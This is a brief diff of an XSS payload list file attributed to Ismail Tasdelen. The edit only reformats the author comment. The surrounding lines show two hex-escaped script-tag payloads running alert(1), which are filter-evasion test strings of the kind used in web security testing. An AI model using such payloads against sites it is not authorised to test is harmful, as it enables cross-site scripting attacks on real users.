@@ -1,5 +1,5 @@
 <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
-<!--        Author : Ismail Tasdelen -->
+<!--Author : Ismail Tasdelen-->
 
 <script\x20type="text/javascript">javascript:alert(1);</script>
 <script\x3Etype="text/javascript">javascript:alert(1);</script>
